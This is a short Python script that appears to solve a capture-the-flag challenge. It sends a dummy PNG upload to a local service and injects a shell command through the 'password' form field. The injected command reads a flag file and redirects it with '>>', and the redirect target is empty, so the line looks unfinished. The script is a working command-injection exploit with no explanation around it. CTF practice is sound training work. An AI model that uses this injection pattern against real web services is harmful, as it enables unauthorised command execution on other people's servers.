import requests

def run_command(cmd):
    files = {
        'file': ('test.png', 'hoge', 'image/png')
    }
    payload = {
        'comp': 'T',
        'enc': 'TT',
        'password': cmd
    }
    r = requests.post("http://localhost:13001/upload", files=files, data=payload)
    print(r.text)
    return

if __name__ == '__main__':
    run_command("cat flowey_the_flowey_the_flag >> ")
